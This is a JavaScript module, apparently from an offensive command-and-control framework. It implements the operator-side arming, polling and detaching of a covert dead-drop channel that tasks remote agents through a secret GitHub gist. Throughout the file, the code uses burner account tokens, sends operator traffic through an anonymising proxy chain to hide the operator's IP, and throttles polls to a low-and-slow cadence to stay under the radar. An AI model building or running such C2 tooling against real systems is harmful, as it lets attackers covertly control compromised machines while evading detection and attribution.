// tools/ghc2.mjs — the operator arm/poll path for the 'ghc' cloud/SaaS dead-drop
// transport (engine/ghc2.mjs is the codec+client; callback.mjs runs the mailbox pump).
//
// TOKEN DOCTRINE (absolute): the GitHub token is a BURNER account's fine-grained PAT
// (gist scope only), operator-supplied at engagement time via the ghc2.token settings
// key (secret-class) — NEVER the operator's real account, NEVER committed, NEVER logged.
// Every report this file returns carries token PRESENCE + class only (tokenMeta); the
// value never leaves the Ghc2Api except in the Authorization header.
//
// EGRESS: polls/posts ride the ghost chain when armed — resolveGhcTransport threads the
// ghost agents exactly like cfride does (broker ghostRideState + the same fail-closed
// posture): ghost 'required' + unverified chain to a PUBLIC api base = REFUSED. A
// loopback/private api base is direct per ghost doctrine (and is the hermetic-test path).
//
// NEVER THROWS: every refusal/failure is data ({ ok:false, reason }).
//
// RATE REALITY: the authenticated REST budget is 5,000 req/hr per token and BOTH sides
// spend from it (channel polls + agent check-ins). The arm path surfaces the live budget
// (GET /rate_limit — free) and the cadence defaults to 60s+jitter: this channel is for
// low-and-slow tasking, not interactive shells.

import { Ghc2Api, GHC2_RATE, tokenMeta } from '../engine/ghc2.mjs';
import { isPrivateDest } from '../engine/ghost.mjs';
import { ghostRideState } from './clearance/broker.mjs';
import { Settings } from '../engine/settings.mjs';

const msg = (e) => String((e && e.message) || e);

// Read the ghc2.* settings bucket. Never throws — an unreadable store reads as
// disabled/absent (the fail-closed arm refusal below then names exactly what is missing).
// The token comes back RAW here (the arm path must hand it to the Ghc2Api) — it is never
// logged and never appears in any report this file returns.
export async function readGhc2Settings({ engagement, settings } = {}) {
  try {
    const s = settings || Settings.for(engagement || 'default');
    return {
      enabled: s.get('ghc2.enabled') === true,
      token: String(s.get('ghc2.token') || ''),
      gistId: String(s.get('ghc2.repo') || ''),
      intervalSec: Number(s.get('ghc2.intervalSec')) || GHC2_RATE.defaultIntervalSec,
    };
  } catch {
    return { enabled: false, token: '', gistId: '', intervalSec: GHC2_RATE.defaultIntervalSec };
  }
}

// Ghost threading for the mailbox leg (the cfride parity decision, SaaS-shaped):
//   loopback/private api base  -> direct, always (ghost doctrine: lab traffic never
//                                  leaves the lab — this is also the hermetic-test path)
//   ghost off                  -> direct
//   ghost on + chain           -> ride ghost.agents()
//   ghost on, no chain         -> direct, honestly labeled (best-effort mode)
//   ghost required             -> chain REQUIRED and verified (one verify attempt), else
//                                  REFUSED fail-closed — the operator IP never touches
//                                  api.github.com when required mode is armed
// Result: { ok, direct, agents, transport } or { ok:false, reason }. Never throws.
export async function resolveGhcTransport({ ghost, ghostMode, apiBase = 'https://api.github.com' } = {}) {
  const mode = ghostMode || (ghost && ghost.mode) || 'off';
  try {
    let host = '';
    try { host = new URL(String(apiBase)).hostname; } catch { return { ok: false, reason: 'unparseable ghc api base URL — refusing (fail-closed)' }; }
    if (isPrivateDest(host)) {
      return { ok: true, direct: true, agents: null, transport: 'direct (private/loopback api base — ghost doctrine: lab traffic never leaves the lab)' };
    }
    if (mode === 'off') return { ok: true, direct: true, agents: null, transport: 'direct (ghost off)' };
    if (!ghost || !ghost.chain || !ghost.chain.length) {
      if (mode === 'required') return { ok: false, reason: 'ghost mode is REQUIRED but no chain is armed — the operator egress must never touch the SaaS mailbox directly. Arm a chain first. ghc arm REFUSED (fail-closed).' };
      return { ok: true, direct: true, agents: null, transport: 'direct (ghost on but no chain armed — best-effort mode, labeled honestly)' };
    }
    if (mode === 'required' && !ghost.verifiedOk()) {
      try { await ghost.verify(); } catch { /* handled by the check below */ }
      if (!ghost.verifiedOk()) {
        return { ok: false, reason: 'ghost mode is REQUIRED but the chain exit is NOT verified — public SaaS egress REFUSED (fail-closed). Run the ghost self-check first.' };
      }
    }
    return { ok: true, direct: false, agents: ghost.agents(), transport: 'ghost chain (' + ghost.chain.length + ' hop(s))' };
  } catch (e) {
    return { ok: false, reason: 'ghc transport resolution failed (' + msg(e) + ') — refusing (fail-closed)' };
  }
}

// ARM: read settings (default-OFF refusal), thread the ghost chain, run the FREE
// /rate_limit token+budget check, then attach the channel's mailbox pump. The report
// carries token presence/class + the live budget — NEVER the token value. Never throws.
export async function armGhc({ engagement, channel, settings, ghost, ghostMode, apiBase, client, intervalSec } = {}) {
  try {
    if (!channel || typeof channel.attachGhc !== 'function') {
      return { ok: false, reason: 'no callback channel to attach to — arm the channel first (/api/channel/arm)' };
    }
    const cfg = await readGhc2Settings({ engagement, settings });
    if (!cfg.enabled) {
      return { ok: false, reason: 'ghc2 is DISABLED (ghc2.enabled=false — the default). This channel tasks agents through a third-party SaaS dead-drop; the engagement must explicitly opt in: settings set ghc2.enabled true' };
    }
    if (!cfg.token) {
      return { ok: false, reason: 'no ghc2.token — the doctrine is a BURNER account\'s fine-grained PAT (gist scope only), supplied at engagement time: settings set ghc2.token <burner-pat>. NEVER the operator\'s real account token' };
    }
    if (!cfg.gistId) {
      return { ok: false, reason: 'no ghc2.repo — the dead-drop mailbox is a SECRET (unlisted) gist owned by the burner account: settings set ghc2.repo <gistId>' };
    }
    const st = (ghost || ghostMode) ? { ghost, ghostMode } : ghostRideState(engagement);
    const t = client ? { ok: true, direct: true, agents: null, transport: 'injected client (test/embedder seam)' }
      : await resolveGhcTransport({ ghost: st.ghost, ghostMode: st.ghostMode, apiBase });
    if (!t.ok) return { ok: false, reason: t.reason };
    const api = client || new Ghc2Api({ token: cfg.token, gistId: cfg.gistId, apiBase: apiBase || 'https://api.github.com', agents: t.agents });

    // The ARM-TIME honesty check: token validity + scope class + the live budget.
    // /rate_limit is FREE (not charged against the 5k/hr core budget). A dead token
    // refuses the arm loudly; the refusal text names the burner doctrine.
    const rl = await api.rateLimit();
    if (!rl.ok) return { ok: false, reason: 'token-scope check failed: ' + rl.error, status: rl.status };
    const cadence = Math.max(GHC2_RATE.minIntervalSec, Number(intervalSec) || cfg.intervalSec || GHC2_RATE.defaultIntervalSec);
    const status = channel.attachGhc({ client: api, intervalSec: cadence });
    return {
      ok: true,
      armed: status,
      transport: t.transport,
      gistId: cfg.gistId,
      intervalSec: cadence,
      token: api.tokenMeta ? api.tokenMeta() : tokenMeta(cfg.token), // presence + class ONLY
      budget: rl.core,                                                // { limit, remaining, reset, secondsToReset }
      note: 'LOW-AND-SLOW channel: ~' + cadence + 's+jitter channel-side polls; the 5,000 req/hr budget is shared with the agent leg. Tasking only — interactive shells belong on http/ws. Result pushes chunk at ' + GHC2_RATE.chunkBytes + ' bytes/comment.',
    };
  } catch (e) {
    return { ok: false, reason: 'ghc arm failed (' + msg(e) + ') — nothing attached' };
  }
}

// Manual one-shot mailbox poll (the channel must already be ghc-attached). Never throws.
export async function pollGhc({ channel } = {}) {
  try {
    if (!channel || typeof channel.ghcPollNow !== 'function') return { ok: false, reason: 'no callback channel armed' };
    return await channel.ghcPollNow();
  } catch (e) { return { ok: false, reason: 'ghc poll failed (' + msg(e) + ')' }; }
}

// Detach the mailbox pump (the channel's other transports are untouched). Never throws.
export function detachGhc({ channel } = {}) {
  try {
    if (!channel || typeof channel.detachGhc !== 'function') return { ok: false, reason: 'no callback channel armed' };
    channel.detachGhc();
    return { ok: true };
  } catch (e) { return { ok: false, reason: 'ghc detach failed (' + msg(e) + ')' }; }
}

export { GHC2_RATE };
